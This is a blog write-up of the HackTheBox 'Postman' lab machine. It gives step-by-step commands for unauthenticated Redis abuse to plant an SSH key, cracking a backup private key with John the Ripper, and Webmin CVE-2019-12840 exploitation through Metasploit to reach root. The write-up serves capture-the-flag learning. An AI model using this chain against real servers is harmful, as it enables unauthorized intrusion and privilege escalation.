---
title: Write-up Postman Machine
author: pcw3r
date: 2020-02-02 11:33:00 +0800
categories: [HackTheBox, Pentest]
tags: [LINUX, EASY, ENUMERATION, DATABASE EXPLOITATION, WEB EXPLOITATION, PASSWORD CRACKING, CVE]
math: true
---

**<center>RefÂ°: HTB-01-Pentest</center>**

![Desktop View]({{ "/assets/img/postman/HTB-Badge-Postman.png" | relative_url }})

--- Postman is a Linux machine that highlights the exploitation of the RCE on the Redis service to gain access and allow to enumerate to escalate our privileges through a found and cracked backup ssh key. That to get Flag user.

A CVE is present in Webmin service to get root privilege and our user have sufficiently right to exploit it through Metasploit module. That to get Flag root.

![Desktop View]({{ "/assets/img/postman/HTB-Information-Postman.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Check all services
***

We find interesting services: `ssh`, `web`, `redis` and `webmin`.

```terminal
$ nmap -A -T5 10.10.10.160 -p-
```

### Redis
***

Access to the service Redis is not protected by password.

### Web
***

Webmin run on the web service in version `1.910`.

### Vulnerabilities
***

Redis is not protected by password and we can access with telnet command. We can write and push our SSH Public Key file in authorized_keys. After we are the possibility to logging on to the victim machine through SSH.

The service Webmin present two CVE : 2006-3392 and 2019-12840. The second is more interesting because we can execute arbitrary commands with root privileges via the data parameter to update.cgi. But we need to have a user authorized to the "Package Updates" module.

Reference - exploit CVE : <https://www.cvedetails.com/cve/CVE-2019-12840/>

Metasploit module exists.


## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### SSH Authorized Keys from RCE Execution
***
Reference - exploit RCE : <https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html>

```terminal
$ sh-keygen -t rsa -b 2048
$ (echo -e "\n\n"; cat postman.pub; echo -e "\n\n") > foo.txt
$ cat /root/.ssh/foo.txt | redis-cli -h 10.10.10.160 -x set s-key

$ telnet 10.10.10.160 6379
> config get dir
> config set dir /var/lib/redis/.ssh
> config set dbfilename authorized_keys
> save
> quit

$ ssh redis@10.10.10.160 -i postman
```

![Desktop View]({{ "/assets/img/postman/HTB-Images-redisrce.png" | relative_url }})

The exploitation is successful and we have gained a foothold.

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Cracking Password
***
With `locate command` we found a backup of ssh key and its owner is Matt.

```terminal
$ locate id_rsa
$ ls -la /opt/
```

![Desktop View]({{ "/assets/img/postman/HTB-Images-sshkey.png" | relative_url }})

We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.

Reference - johntheripper tool : <https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c>

```terminal
$ ./ssh2john.py ~/.ssh/Matt > Matt.hash
$ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou.txt Matt.hash
```

We crack the password of the user Matt : `computer2008`.

We cannot access in ssh with this user due to a restriction in the ssh configuration file.
But we have the possibility to escalate with the `su command` from our victim machine.

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### CVE 2019-12840 Exploitation
***
Matt user have access on Webmin and he have sufficiently right on `Package Updates` module to execute CVE 2019-12840 and obtain root privilege.

![Desktop View]({{ "/assets/img/postman/HTB-Images-SoftwarePackage.png" | relative_url }})

```terminal
$ msfconsole
msf5 > search webmin
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 > show options
msf5 > set username Matt
msf5 > set password computer2008
msf5 > set lhost 10.10.15.122
msf5 > set rhost 10.10.10.160
msf5 > set ssl true
msf5 > check
msf5 > exploit

$ whoami
root

$ cat /root/root.txt
```

We have compromise Postman machine.


***

## **<center>Trophy</center>**

> **A hacker does for love what others would not do for money.**
>
> Laura Creighton
